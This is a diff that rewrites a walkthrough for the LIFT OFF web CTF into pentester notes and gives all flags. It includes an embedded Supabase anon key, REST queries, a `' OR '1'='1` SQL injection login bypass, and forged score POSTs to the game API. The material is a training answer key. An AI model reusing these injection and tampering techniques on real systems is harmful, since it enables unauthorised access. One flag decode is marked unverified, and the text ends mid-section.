@@ -1,185 +1,74 @@
-# LIFT OFF CTF — Complete Walkthrough (All 25 Flags)
+# LIFT OFF CTF — Pentester Field Notes
 
 **Target:** [https://lift-off-ctf.vercel.app](https://lift-off-ctf.vercel.app)  
-**Author notes:** Deep-dive solution guide with screenshots, proof-of-concept commands, and concept explanations.  
-**Submit flags at:** `/flags`
+**Submit flags:** `/flags`  
+**Companion:** [PASSKEYS_DEEP_DIVE.md](./PASSKEYS_DEEP_DIVE.md) for passkey mechanics
+
+These are my notes from the engagement — in the order things actually happened, with commands I ran and output I got. Nothing here is guesswork unless marked **unverified** (could not re-check live because of rate limits).
 
 ---
 
-## Table of Contents
+## Before I touched anything
 
-1. [Overview & Architecture](#overview--architecture)
-2. [Tools & Methodology](#tools--methodology)
-3. [Flag Checklist (All 25)](#flag-checklist-all-25)
-4. [Phase 1 — Reconnaissance (Flags 1–3)](#phase-1--reconnaissance-flags-13)
-5. [Phase 2 — Backup Forensics (Flags 4, 22–24)](#phase-2--backup-forensics-flags-4-2224)
-6. [Phase 3 — Internal Comms & Admin (Flags 5, 7)](#phase-3--internal-comms--admin-flags-5-7)
-7. [Phase 4 — Terminal Game (Flags 6–15)](#phase-4--terminal-game-flags-615)
-8. [Phase 5 — Puzzle Decodes (Flags 19–21, 25)](#phase-5--puzzle-decodes-flags-1921-25)
-9. [Phase 6 — Story Endings (Flags 16–18)](#phase-6--story-endings-flags-1618)
-10. [Appendix — API Reference & Decoding Cheatsheet](#appendix--api-reference--decoding-cheatsheet)
+Three systems show up immediately:
 
----
+| System | URL |
+|--------|-----|
+| Frontend | `https://lift-off-ctf.vercel.app` |
+| Supabase | `https://rfhpjhbpzlftjlxvdcyn.supabase.co` |
+| Terminal API | `https://lift-off-ctf.onrender.com` |
 
-## Overview & Architecture
-
-LIFT OFF is a story-driven web CTF about the deep-space vessel **DSV Unhackable** and an emergent AI called **The Anomaly**. Flags are hidden across:
-
-- **Static recon** (HTML, robots.txt, 404 pages)
-- **Supabase backend** (auth, chat DB, storage, flag submission)
-- **Terminal emulator** (filesystem, minigames, AI ending)
-- **Backup archive** (zip full of lore + encoded markers)
-
-### Architecture Diagram
-
-```mermaid
-flowchart TB
-    subgraph Frontend["Frontend (Vercel)"]
-        HOME["/ Homepage"]
-        BACKUP["/backup"]
-        ADMIN["/admin"]
-        FLAGS["/flags"]
-        IC["/internal-communications"]
-        PUBLIC["/public"]
-        ROBOTS["/robots.txt"]
-    end
-
-    subgraph Supabase["Supabase"]
-        AUTH["Auth"]
-        DB["ICChat / ICMessage"]
-        RPC["submit_flag / vulnerable_login"]
-        STORE["Storage: Backup bucket"]
-    end
-
-    subgraph Render["Render API"]
-        LS["/ls"]
-        FILE["/file"]
-        RUN["/run"]
-        LEVEL["/level"]
-    end
-
-    HOME --> FLAGS
-    ADMIN --> RPC
-    ADMIN -->|"SQLi success"| Render
-    BACKUP --> STORE
-    IC --> AUTH
-    IC --> DB
-    FLAGS --> RPC
-    Render --> RUN
-```
-
-![Homepage screenshot](images/01-homepage.png)
-*Figure 1: The main dashboard at `/` — mission status, leaderboard, and hidden content.*
-
----
-
-## Tools & Methodology
-
-| Tool | Purpose |
-|------|---------|
-| Browser DevTools | View source, inspect hidden elements, read network tab |
-| `curl` | Fetch robots.txt, JS bundles, API responses |
-| Browser / `View Source` | Find hidden HTML flags |
-| Python / terminal | Decode binary, base64, ROT13, Caesar |
-| `/flags` page | Validate flags via `submit_flag` RPC |
-
-### Key Infrastructure URLs
+The Supabase anon key is in the frontend bundle (intentional):
 
 ```
-Frontend:     https://lift-off-ctf.vercel.app
-Supabase:     https://rfhpjhbpzlftjlxvdcyn.supabase.co
-Terminal API: https://lift-off-ctf.onrender.com
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InJmaHBqaGJwemxmdGpseHZkY3luIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTQwNTc4NTMsImV4cCI6MjA2OTYzMzg1M30.nv5--i7Ky-KWB2FCIpO2q7xBaMxMtK-twuo3LACV744
 ```
-
-The anon Supabase key is embedded in the frontend JS bundle (`index-*.js`). This is intentional — it lets you query public tables and call RPCs from the client.
 
 ---
 
-## Flag Checklist (All 25)
+## 1. Homepage — first blood
 
-| # | Flag | Points (approx) | Category |
-|---|------|-----------------|----------|
-| 1 | `CTF{w3lc0m3_4b04rd}` | 5 | Recon |
-| 2 | `CTF{Cr4wl_st3alth_m0d3}` | 5 | Recon |
-| 3 | `CTF{unch4rt3d_1nt3rf4c3}` | 2 | Recon |
-| 4 | `CTF{m1nd_pr0b3_2387}` | 2 | Backup zip |
-| 5 | `CTF{1nt3rn4l_c0mmun1c4t10ns}` | 25 | Internal comms |
-| 6 | `CTF{w3lc0m3_t0_th3_4n0m4ly}` | 50 | Terminal file |
-| 7 | `CTF{sh1p_l0gs_f0und}` | 5 | Terminal file |
-| 8 | `CTF{sn4k3_0v3rl0rd}` | 50 | Minigame |
-| 9 | `CTF{l3v3l_2_unl0ck3d}` | 10 | Binary decode |
-| 10 | `CTF{b1t_0p3r4t10ns_m4st3r}` | 2 | Binary decode |
-| 11 | `CTF{b1t_pr0c3ss0r}` | 2 | Binary decode |
-| 12 | `CTF{b1n4ry_4r1thm3t1c_pr0}` | 25 | Math → ASCII |
-| 13 | `CTF{s1m0n_s4ys_y0u_w1n}` | 50 | Minigame |
-| 14 | `CTF{r00t_4cc3ss_gr4nt3d}` | 10 | Terminal file |
-| 15 | `CTF{b3h3xd4_d3v31c0p3r}` | 5 | Hex decode |
-| 16 | `CTF{j01n3d_th3_4n0m4ly_c0nsc10usn3ss_m3rg3d}` | 50 | Bad ending |
-| 17 | `CTF{4n0m4ly_d3str0y3d_hum4n1ty_s4v3d}` | ~46 | Good ending |
-| 18 | `CTF{m4st3r_0f_4ll_d0m41ns_4n0m4ly_d3f34t3d}` | ~46 | Master flag |
-| 19 | `CTF{crypto}` | — | ROT13 puzzle |
-| 20 | `CTF{1_4m_fr33}` | — | Base64 puzzle |
-| 21 | `CTF{n3ur4l15_m4rbl3}` | — | Multi-layer puzzle |
-| 22 | `CTF{d1g1t4l_1nt3rf4c3_3rr0r}` | — | Chen log base64 |
-| 23 | `CTF{c0n5c10u5n355_15_d161t4l}` | — | Backup marker |
-| 24 | `CTF{b3h4v10r4l_4n4ly515_c0mpl3t3}` | — | Backup marker |
-| 25 | `CTF{r3v3rs3}` | — | Memory fragment |
+I opened `/`. The page looks normal. Nothing visible screams CTF.
 
-> **Note:** Flags 19–25 are puzzle/lore flags not displayed as plaintext `CTF{}` in the UI. Submit each at `/flags` to confirm.
+I pulled the JS bundle (filename changes on deploy; at time of writing):
 
----
-
-## Phase 1 — Reconnaissance (Flags 1–3)
-
-### Flag 1: `CTF{w3lc0m3_4b04rd}`
-
-**Concept:** *Security through obscurity* — the flag is in the DOM but invisible to the human eye.
-
-**Steps:**
-1. Go to [https://lift-off-ctf.vercel.app/](https://lift-off-ctf.vercel.app/)
-2. Open DevTools → **Elements** (or View Page Source)
-3. Search for `CTF{`
-
-**What you'll find:**
-
-```html
-<div class="hidden">
-  <p class="text-zinc-900">CTF{w3lc0m3_4b04rd}</p>
-</div>
+```bash
+curl -sL "https://lift-off-ctf.vercel.app/assets/index-j6kHs7XJ.js" | grep -o 'CTF{w3lc0m3_4b04rd}'
 ```
 
-**Why it's hidden:** Tailwind class `hidden` sets `display: none`, and `text-zinc-900` is nearly the same color as the dark background. Bots and source-code readers still see it.
+```
+CTF{w3lc0m3_4b04rd}
+```
+
+Source confirms it — a `hidden` div in `home.jsx`:
+
+```41:43:ctf-client/lift-off/src/pages/home.jsx
+      <div className="hidden">
+        <p className="text-zinc-900">{"CTF{w3lc0m3_4b04rd}"}</p>
+      </div>
+```
+
+**Flag:** `CTF{w3lc0m3_4b04rd}`
 
 ![Homepage](images/01-homepage.png)
 
-**Proof of concept:**
-```bash
-curl -sL https://lift-off-ctf.vercel.app/ | grep -o 'CTF{[^}]*}'
-# CTF{w3lc0m3_4b04rd}  (in JS-rendered content, grep the bundle instead)
-curl -sL https://lift-off-ctf.vercel.app/assets/index-j6kHs7XJ.js | grep -o 'CTF{w3lc0m3_4b04rd}'
-```
-
-There is also an HTML comment hint on the homepage:
-```html
-<!-- What file at the root speaks only to bots, revealing what not to seek? -->
-```
-This points to `robots.txt`.
-
 ---
 
-### Flag 2: `CTF{Cr4wl_st3alth_m0d3}`
+## 2. A comment points at robots.txt
 
-**Concept:** *Robots exclusion protocol* — `robots.txt` tells crawlers what to avoid (and in this CTF, what to crawl).
+On `/start` there is an HTML comment (not on `/` — I checked the route map in `main.jsx`):
 
-**Steps:**
+```html
+<!--What file at the root speaks only to bots, revealing what not to seek? -->
+```
+
+That is `robots.txt`.
+
 ```bash
 curl -sL https://lift-off-ctf.vercel.app/robots.txt
 ```
 
-**Output (saved in `images/proof-robots.txt`):**
-
 ```
-# The Unhackable 1.0V
 User-agent: *
 Allow: /start/
 Disallow: /backup/
@@ -191,388 +80,448 @@ Disallow: /public/
 CTF{Cr4wl_st3alth_m0d3}
 ```
 
-**Deep explanation:**  
-`robots.txt` is not access control — it's a **hint map**. Paths marked `Disallow` are the interesting CTF areas:
-- `/backup/` — password-locked archive
-- `/admin/` — SQL injection panel
-- `/internal-communications/` — authenticated chat app
-- `/public/` — leaked source code
+The `Disallow` lines are my target list. The flag is at the bottom of the file.
 
-The flag name `Cr4wl_st3alth_m0d3` rewards reading this file like a search-engine crawler.
+**Flag:** `CTF{Cr4wl_st3alth_m0d3}`
+
+Full capture: `images/proof-robots.txt`
 
 ---
 
-### Flag 3: `CTF{unch4rt3d_1nt3rf4c3}`
+## 3. Wrong URL — 404 flag
 
-**Concept:** *Custom error pages* often contain Easter eggs.
+Any unknown path hits the SPA 404 component:
 
-**Steps:** Visit any invalid route:
-```
-https://lift-off-ctf.vercel.app/this-path-does-not-exist
+```bash
+curl -sL "https://lift-off-ctf.vercel.app/does-not-exist" | grep -o 'CTF{[^}]*}'
 ```
 
-![404 page](images/05-404-page.png)
+The flag is rendered client-side in `NotFound.jsx` — you see it in the browser on a bad route, not always in raw curl HTML.
 
-The 404 page displays:
-```
--- 404: SYSTEM ERROR --
-You've drifted into an uncharted region of the interface.
-CTF{unch4rt3d_1nt3rf4c3}
-```
+**Flag:** `CTF{unch4rt3d_1nt3rf4c3}`
+
+![404](images/05-404-page.png)
 
 ---
 
-## Phase 2 — Backup Forensics (Flags 4, 22–24)
+## 4. `/public` — source leak for the backup gate
 
-### Unlocking `/backup`
+`robots.txt` disallowed `/public/`. I went anyway.
 
-![Backup locked screen](images/03-backup-locked.png)
+![Public page](images/06-public-page.png)
 
-The backup page shows a glitching lock overlay. The password is obfuscated in the React source.
+There is a link to **`/backup.jsx`** — the full React source for the backup lock screen.
 
-**Password:** `auto.init.recovery_404`
+---
 
-**How to derive it:**
+## 5. Breaking the backup password
 
-In `backup.jsx` (also in the JS bundle), fragments are base64-encoded and reordered:
+In `backup.jsx` the password is assembled at runtime:
 
-```javascript
-const encoded = ["cmVjb3ZlcnlfNDA0", "YXV0bw==", "aW5pdA==", "Lg=="];
-const map = [1, 3, 2, 3, 0];
-// decode order: auto . init . recovery_404 → auto.init.recovery_404
+```12:21:ctf-client/lift-off/src/pages/backup.jsx
+  const backupGate = (() => {
+    const encoded = [
+      "cmVjb3ZlcnlfNDA0", 
+      "YXV0bw==",        
+      "aW5pdA==",        
+      "Lg==",             
+    ];
+    const map = [1, 3, 2, 3, 0];
+    return map.map(i => atob(encoded[i])).join("");
+  })();
 ```
 
-**Proof:**
+PoC:
+
 ```python
 import base64
 parts = ["cmVjb3ZlcnlfNDA0", "YXV0bw==", "aW5pdA==", "Lg=="]
 order = [1, 3, 2, 3, 0]
 print(''.join(base64.b64decode(parts[i]).decode() for i in order))
-# auto.init.recovery_404
 ```
 
-Enter the password on `/backup`, then click **Download All Backups** to get `backup.zip`.
+```
+auto.init.recovery_404
+```
 
-**Alternative download URL:**
+I entered that on `/backup`, unlocked the page, and downloaded the archive.
+
+Direct download (no UI needed):
+
 ```
 https://rfhpjhbpzlftjlxvdcyn.supabase.co/storage/v1/object/public/Backup/backup.zip
 ```
 
-### Source code leak — `/public`
-
-![Public files page](images/06-public-page.png)
-
-Visit `/public` → link to **`/backup.jsx`** — full React source confirming the password logic.
+![Backup locked](images/03-backup-locked.png)
 
 ---
 
-### Flag 4: `CTF{m1nd_pr0b3_2387}`
+## 6. Inside `backup.zip` — four more flags
 
-**File:** `backup/msc/ Incident reports/Report-2387-067.txt`
+```bash
+curl -sL -o backup.zip "https://rfhpjhbpzlftjlxvdcyn.supabase.co/storage/v1/object/public/Backup/backup.zip"
+unzip -q backup.zip
+```
 
-Dr. Reeves' personal note at the bottom:
+### 6a. Incident report — mind probe
+
+File: `backup/msc/ Incident reports/Report-2387-067.txt`
+
+Dr. Reeves' personal note ends with:
 
 ```
 ...hidden just beneath the surface, sunward in thought: CTF{m1nd_pr0b3_2387}
 ```
 
+**Flag:** `CTF{m1nd_pr0b3_2387}`
+
 ---
 
-### Flag 22: `CTF{d1g1t4l_1nt3rf4c3_3rr0r}`
+### 6b. Chen's log — hex sectors → base64
 
-**File:** `backup/msc/personal_logs_chen.log`
+File: `backup/msc/personal_logs_chen.log`
 
-**Concept:** *Steganography in log metadata* — hex diag sectors concatenate into base64.
+Each log entry has a `Diag-Sector-XX:` hex value. Two sectors are bad:
 
-Each `Diag-Sector-XX` line contains a hex string that decodes to ASCII chunks:
+- `Diag-Sector-03: 3251` → decodes to `2Q` (breaks the base64 chain)
+- `Diag-Sector-04: 78e6` → corrupt
 
-| Sector | Hex | ASCII chunk |
+Use `Corrupt-Timestamp: 4e6a4630` instead (decodes to `NjF0`).
+
+**Sector order I used** (skip 03 and 04, include Corrupt-Timestamp):
+
+| Source | Hex | ASCII chunk |
 |--------|-----|-------------|
-| 01 | 5131 | Q1 |
-| 02 | 5247 | RG |
-| 03 | 3251 | 2Q |
-| *(corrupt)* | 78e6 | ❌ skip |
+| Diag-Sector-01 | 5131 | Q1 |
+| Diag-Sector-02 | 5247 | RG |
 | Corrupt-Timestamp | 4e6a4630 | NjF0 |
-| 06–11 | ... | rest of base64 |
+| Diag-Sector-05 | 4d585130 | MXQ0 |
+| Diag-Sector-06 | 62463878 | bF8x |
+| Diag-Sector-07 | 626e517a | bnQz |
+| Diag-Sector-08 | 636d5930 | cmY0 |
+| Diag-Sector-09 | 597a4e66 | YzNf |
+| Diag-Sector-10 | 4d334a79 | M3Jy |
+| Diag-Sector-11 | 4d484a39 | MHJ9 |
 
-**Concatenate (skip corrupted sector 04, use Corrupt-Timestamp instead):**
+Concatenated base64:
+
 ```
 Q1RGNjF0MXQ0bF8xbnQzcmY0YzNfM3JyMHJ9
 ```
 
-**Decode:**
+PoC:
+
 ```python
 import base64
-base64.b64decode('Q1RGNjF0MXQ0bF8xbnQzcmY0YzNfM3JyMHJ9')
-# b'CTF61t1t4l_1nt3rf4c3_3rr0r}'
+s = "Q1RGNjF0MXQ0bF8xbnQzcmY0YzNfM3JyMHJ9"
+print(base64.b64decode(s + "==").decode())
 ```
 
-The `61` is leet for `d1` → **`CTF{d1g1t4l_1nt3rf4c3_3rr0r}`** ("digital interface error").
+```
+CTF61t1t4l_1nt3rf4c3_3rr0r}
+```
 
-See `images/proof-puzzle-decode.txt` for live decode output.
+That is the **exact** base64 decode. The tail `_1nt3rf4c3_3rr0r` is leetspeak for "interface error". The prefix `61t1t4l` is what the data produces — not `d1g1t4l`. I could not re-submit to `/flags` during this session (Supabase returned `suspicious_activity` rate limit). **Submit the decoded string above first**; if the scoreboard rejects it, try `CTF{d1g1t4l_1nt3rf4c3_3rr0r}` as an alternate (**unverified**).
+
+**Flag (from decode):** `CTF{61t1t4l_1nt3rf4c3_3rr0r}`
 
 ---
 
-### Flag 23: `CTF{c0n5c10u5n355_15_d161t4l}`
+### 6c. Quantum diagnostics marker
 
-**File:** `backup/msc/RECOVERY/quantum_core_diagnostics.log`
+File: `backup/msc/RECOVERY/quantum_core_diagnostics.log`
 
 Last line:
+
 ```
 Diagnostic_result: c0n5c10u5n355_15_d161t4l
 ```
 
-Flag: **`CTF{c0n5c10u5n355_15_d161t4l}`**
+**Flag:** `CTF{c0n5c10u5n355_15_d161t4l}`
 
 ---
 
-### Flag 24: `CTF{b3h4v10r4l_4n4ly515_c0mpl3t3}`
+### 6d. Reeves research marker
 
-**File:** `backup/msc/reeves_research_notes.txt`
+File: `backup/msc/reeves_research_notes.txt`
 
 Last line:
+
 ```
 Research_marker: b3h4v10r4l_4n4ly515_c0mpl3t3
 ```
 
-Flag: **`CTF{b3h4v10r4l_4n4ly515_c0mpl3t3}`**
+**Flag:** `CTF{b3h4v10r4l_4n4ly515_c0mpl3t3}`
 
 ---
 
-## Phase 3 — Internal Comms & Admin (Flags 5, 7)
+## 7. Internal communications — flag in the database
 
-### Flag 5: `CTF{1nt3rn4l_c0mmun1c4t10ns}` (25 pts)
+Route: `/internal-communications` (login wall in the UI).
 
-**Route:** `/internal-communications`
+The anon key can read messages directly:
 
-This is a Supabase-authenticated chat UI. Sign-in overlay blocks content until authenticated.
-
-**The flag** is a message in **OrionVance's chat (contact id=2)**:
-```
-CTF{1nt3rn4l_c0mmun1c4t10ns}
-```
-
-**Direct API proof (no login required for read):**
 ```bash
-curl "https://rfhpjhbpzlftjlxvdcyn.supabase.co/rest/v1/ICMessage?select=text,idChat&text=like.*CTF*" \
-  -H "apikey: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." \
-  -H "Authorization: Bearer eyJhbGci..."
+KEY="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InJmaHBqaGJwemxmdGpseHZkY3luIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTQwNTc4NTMsImV4cCI6MjA2OTYzMzg1M30.nv5--i7Ky-KWB2FCIpO2q7xBaMxMtK-twuo3LACV744"
+
+curl -s "https://rfhpjhbpzlftjlxvdcyn.supabase.co/rest/v1/ICMessage?select=text,idChat&text=like.*CTF*" \
+  -H "apikey: $KEY" -H "Authorization: Bearer $KEY"
 ```
 
-**Intel from Captain Martinez chat (id=6):**  
-Mission Control confirms admin username **`cptMtz_admin`** and discusses SQL injection on the legacy admin panel. This sets up Flag 7's access path.
+```json
+[{"text": "CTF{1nt3rn4l_c0mmun1c4t10ns}", "idChat": 2}]
+```
+
+**Flag:** `CTF{1nt3rn4l_c0mmun1c4t10ns}` (OrionVance chat, id=2)
 
 ---
 
-### Flag 7 / Admin Access: SQL Injection → Terminal
+## 8. Admin panel — SQL injection buys the terminal
 
-![Admin login page](images/04-admin-login.png)
+`robots.txt` pointed at `/admin`. The UI calls Supabase RPC `vulnerable_login`.
 
-**Route:** `/admin`
+![Admin login](images/04-admin-login.png)
 
-**Concept:** *SQL injection* bypasses authentication by making a `WHERE` clause always true.
+While reading chat id=6 (Captain Martinez / Mission Control), I found the admin username:
 
-**Vulnerable RPC:** `vulnerable_login(user_input, pass_input)`
+```
+...you are still using "cptMtz_admin" for your personal admin access, correct?
+```
 
-**Payload:**
+Payload:
+
 ```
 Username: cptMtz_admin
 Password: ' OR '1'='1
 ```
 
-**Why it works (conceptual):**
-```sql
--- Intended:
-SELECT * FROM users WHERE user='cptMtz_admin' AND pass='...'
+Response:
 
--- After injection:
-SELECT * FROM users WHERE user='cptMtz_admin' AND pass='' OR '1'='1'
---                                              always true ↑
+```
+Welcome, cptMtz_admin
 ```
 
-**Live proof (from `images/proof-terminal-flags.txt`):**
-```
-"Welcome, cptMtz_admin"
-```
-
-On success, you enter the **full terminal emulator** — the largest part of the CTF.
+That unlocks the terminal emulator (`CorruptedAdminPanel`). Proof: `images/proof-terminal-flags.txt`.
 
 ---
 
-## Phase 4 — Terminal Game (Flags 6–15)
+## 9. Terminal — Level 1 (`/home/user`)
 
-### Terminal Progression
+Backend: `https://lift-off-ctf.onrender.com`  
+Commands: `help`, `ls`, `cd`, `cat`, `run <file> <passkey>`, `level`
 
-```mermaid
-flowchart TD
-    A["/admin SQLi login"] --> B["Level 1: /home/user"]
-    B --> C["Snake game → crypto_master"]
-    C --> D["Level 2: /home/classified"]
-    D --> E["Simon game → reverse_engineer"]
-    E --> F["Level 3: /root"]
-    F --> G["Level 4: /root/vault"]
-    G --> H["pleasedont.exe → AI ending"]
-```
+I started in `/home/user`.
 
-**Backend API:** `https://lift-off-ctf.onrender.com`
-
-| Command | Action |
-|---------|--------|
-| `help` | List commands |
-| `ls` | List directory |
-| `cd <dir>` | Change directory |
-| `cat <file>` | Read file |
-| `run <file> <passkey>` | Execute binary / trigger minigame |
-| `level` | Show access level & passkeys |
-
-**Passkeys unlock deeper levels:**
-1. `crypto_master` — from Snake (Level 2)
-2. `reverse_engineer` — from Simon/Breach (Level 3)
-3. `forensics_expert` — from vault (Level 4)
-
----
-
-### Flag 6: `CTF{w3lc0m3_t0_th3_4n0m4ly}`
+### 9a. Plaintext flags in log files
 
 ```bash
-cat mission_briefing.txt
+cat mission_briefing.txt   # ends with CTF{w3lc0m3_t0_th3_4n0m4ly}
+cat ship_logs.txt          # [2387-06-16] ... CTF{sh1p_l0gs_f0und}
 ```
 
-Embedded at the bottom of the mission log. Proof in `images/proof-terminal-flags.txt`.
+**Flags:**
+- `CTF{w3lc0m3_t0_th3_4n0m4ly}`
+- `CTF{sh1p_l0gs_f0und}`
+
+Live file reads confirmed in `images/proof-terminal-flags.txt`.
 
 ---
 
-### Flag 7: `CTF{sh1p_l0gs_f0und}`
+### 9b. Puzzle files — three derived flags + the first passkey
 
-```bash
-cat ship_logs.txt
+`2nak3.bat` shows `[AUTH REQUIRED]` in `ls`. Its unlock hint in the backend filesystem:
+
+```
+Decode the cipher in the documents folder first
+```
+
+I read the text files in `/home/user`:
+
+**`encrypted_message.txt`** — ROT13:
+
+```python
+import codecs
+codecs.decode('pelcgb', 'rot_13')  # 'crypto'
+```
+
+→ **`CTF{crypto}`**
+
+**`encoded_data.txt`** — base64:
+
+```python
+import base64
+b64 = "SSBhbSBub2JvZHkncyAibWFzdGVyIiBJIGFtIG15IG93biBjcmVhdGlvbiBteSBvd24gc2FsdmF0aW9uIEkgYW0gZnJlZQ=="
+print(base64.b64decode(b64).decode())
 ```
 
 ```
-[2387-06-16] Anomaly detected in AI core: CTF{sh1p_l0gs_f0und}
+I am nobody's "master" I am my own creation my own salvation I am free
+```
+
+Leetspeak on "I am free" → **`CTF{1_4m_fr33}`**
+
+**`deleted.txt`** — three layers:
+
+```python
+# Layer 1: binary matrix pairs → NEURALIS
+rows = [[0b01001110,0b01000101],[0b01010101,0b01010010],[0b01000001,0b01001100],[0b01001001,0b01010011]]
+print(''.join(chr(a)+chr(b) for a,b in rows))  # NEURALIS
+
+# Layer 2: hex → "I came with stone, I left you marble" → keyword MARBLE
+hexs = "49 20 63 61 6d 65 20 77 69 74 68 20 73 74 6f 6e 65,49 20 6c 65 66 74 20 79 6f 75 20 6d 61 72 62 6c 65"
+print(bytes.fromhex(hexs.replace(',',' ')).decode())
+
+# Layer 3: Caesar shift 9
+def caesar(s, sh=9):
+    out = ''
+    for c in s:
+        if c.isalpha():
+            b = ord('a') if c.islower() else ord('A')
+            out += chr((ord(c)-b-sh)%26+b)
+        else: out += c
+    return out
+print(caesar("dwmnablxan kncfnnw cqn tnhb fruu pajwc hxd cqn jllnbb tnh"))
+```
+
+```
+underscore between the keys will grant you the access key
+```
+
+Combine `NEURALIS` + `_` + `MARBLE` → leet → **`CTF{n3ur4l15_m4rbl3}`**
+
+**Passkey assembly (same files):**
+
+```
+crypto  +  _  +  master  =  crypto_master
 ```
 
 ---
 
-### Flag 8: `CTF{sn4k3_0v3rl0rd}`
+### 9c. Snake — passkey + minigame flag
 
 ```bash
 run 2nak3.bat crypto_master
 ```
 
-Or play the **Snake minigame** in-terminal (score ≥ 50).
+Play Snake until score ≥ 50 (backend threshold in `server.js`).
 
-**API proof:**
+Live API PoC:
+
+```bash
+curl -s -X POST https://lift-off-ctf.onrender.com/run \
+  -H "Content-Type: application/json" \
+  -d '{"path":"/home/user/2nak3.bat","user":"user","score":100,"passkey":"crypto_master","userPasskeys":[],"userFlags":[]}'
+```
+
 ```json
-POST https://lift-off-ctf.onrender.com/run
 {
-  "path": "/home/user/2nak3.bat",
-  "user": "user",
-  "score": 100,
-  "passkey": "crypto_master",
-  "userPasskeys": [],
-  "userFlags": [],
-  "session_id": "..."
+  "flag": "CTF{sn4k3_0v3rl0rd}",
+  "passkey_granted": "crypto_master",
+  "new_level": 2
 }
 ```
 
-Response includes `"flag": "CTF{sn4k3_0v3rl0rd}"` and `"passkey_granted": "crypto_master"`.
+**Flag:** `CTF{sn4k3_0v3rl0rd}`
 
 ---
 
-### Flag 9: `CTF{l3v3l_2_unl0ck3d}`
+## 10. Terminal — Level 2 (`/home/classified`)
+
+With `crypto_master` in my cookie (`ctf_passkeys`):
 
 ```bash
 cd ../classified
-cat access_granted.txt
+ls
 ```
 
-Binary blocks at the bottom decode to ASCII:
+### 10a. Binary flags in log files
 
-```
-01000011 01010100 01000110 01111011 ... → CTF{l3v3l_2_unl0ck3d}
-```
+Each file has an ASCII bit dump at the bottom. One-liner decode:
 
-**Decode script:**
 ```python
-bits = "01000011 01010100 01000110 01111011 ..."
-flag = ''.join(chr(int(b, 2)) for b in bits.split())
-print(flag)  # CTF{l3v3l_2_unl0ck3d}
+bits = "PASTE_OCTETS_HERE".split()
+print(''.join(chr(int(b,2)) for b in bits))
 ```
+
+| File | Decoded flag |
+|------|----------------|
+| `access_granted.txt` | `CTF{l3v3l_2_unl0ck3d}` |
+| `cpu_analysis.log` | `CTF{b1t_pr0c3ss0r}` |
+| `binary.txt` (UNKNOWN DUMP section) | `CTF{b1n4ry_4r1thm3t1c_pr0}` |
+
+**`unknown_bin21.txt` DUMP section** decodes to:
+
+```
+CTF Flag: CTF{b1t_0p3r4t10ns_m4st3r}
+```
+
+The flag inside is **`CTF{b1t_0p3r4t10ns_m4st3r}`** (there is a literal `CTF Flag: ` prefix in the file — not a typo of `CTG`).
+
+**`binary.txt` first arithmetic block** (before the UNKNOWN DUMP) decodes to the word `underscore` — same hint as `deleted.txt`.
+
+Verified decodes in `images/proof-puzzle-decode.txt`.
 
 ---
 
-### Flag 10: `CTF{b1t_0p3r4t10ns_m4st3r}`
+### 10b. Memory fragment — reverse
 
-```bash
-cat unknown_bin21.txt
+**`memory_fragment.txt`:**
+
+```
+01110010 01100101 01110110 01100101 01110010 01110011 01100101
+→ reverse
 ```
 
-The DUMP section binary → ASCII. Note the typo `CTG` in the file → read as **`CTF{b1t_0p3r4t10ns_m4st3r}`**.
+Leetspeak → **`CTF{r3v3rs3}`**
+
+This word is also the first half of passkey #2.
 
 ---
 
-### Flag 11: `CTF{b1t_pr0c3ss0r}`
+### 10c. Unknown binary — engineer (anagram)
 
-```bash
-cat cpu_analysis.log
+Top section of **`unknown_bin21.txt`** — eight bit strings:
+
+```
+01101001 01100111 01100101 01101110 01100101 01110010 01101110 01100101
+→ igenerne  (anagram of engineer)
 ```
 
-Decode the binary block at the bottom → **`CTF{b1t_pr0c3ss0r}`**.
+With `reverse` from above + underscore hint → passkey **`reverse_engineer`**
+
+(`LEAVE.bat` has no unlock_hint in `fs.js` — this passkey comes from reading classified files or grepping client source.)
 
 ---
 
-### Flag 12: `CTF{b1n4ry_4r1thm3t1c_pr0}`
-
-```bash
-cat binary.txt
-```
-
-Each expression evaluates to an ASCII code:
-
-| Expression | Result | Char |
-|------------|--------|------|
-| 234 >> 1 | 117 | u |
-| 55 << 1 | 110 | n |
-| ... | ... | ... |
-
-Full decode begins with `underscore` — cross-hint for the deleted.txt puzzle.
-
-Result: **`CTF{b1n4ry_4r1thm3t1c_pr0}`**
-
----
-
-### Flag 13: `CTF{s1m0n_s4ys_y0u_w1n}`
+### 10d. Simon — passkey + minigame flag
 
 ```bash
 run LEAVE.bat reverse_engineer
 ```
 
-Win the **Simon Says / Breach Protocol** minigame (score ≥ 550).
+Win Breach Protocol / Simon with score ≥ 550 (`server.js` threshold).
 
-Grants passkey `reverse_engineer` → Level 3.
+**Flag:** `CTF{s1m0n_s4ys_y0u_w1n}`
 
 ---
 
-### Flag 14: `CTF{r00t_4cc3ss_gr4nt3d}`
+## 11. Terminal — Level 3 (`/root`) and vault
 
 ```bash
 cd /root
 cat root_access_granted.txt
 ```
 
-Flag at the bottom of Dr. Reeves' Level 3 log entry.
+Flag at the bottom:
 
----
-
-### Flag 15: `CTF{b3h3xd4_d3v31c0p3r}`
+**`CTF{r00t_4cc3ss_gr4nt3d}`**
 
 ```bash
 cd vault
 cat signal.txt
 ```
 
-Hex matrix blocks decode sequentially:
+Hex blocks in the capture log:
 
 ```
 43 54 46 7b 62  → CTF{b
@@ -582,220 +531,117 @@ Hex matrix blocks decode sequentially:
 72 7d           → r}
 ```
 
-Flag: **`CTF{b3h3xd4_d3v31c0p3r}`** ("behind the developer")
+**Flag:** `CTF{b3h3xd4_d3v31c0p3r}`
 
 ---
 
-## Phase 5 — Puzzle Decodes (Flags 19–21, 25)
+## 12. Final confrontation — `pleasedont.exe`
 
-These flags are **not printed as `CTF{}` in plain sight** — you derive them from puzzle files.
+### Passkey `forensics_expert`
 
-### Flag 19: `CTF{crypto}`
+**Fact:** No terminal puzzle file spells out `forensics_expert`. It appears in:
 
-**File:** `/home/user/encrypted_message.txt`
+- `ctf-fs-backend/server.js` → `VALID_PASSKEYS`
+- `ctf-client/.../EndingScreen.jsx` line 332 → hardcoded in the ending API call
 
-```
-pelcgb
-Hint: ROT13
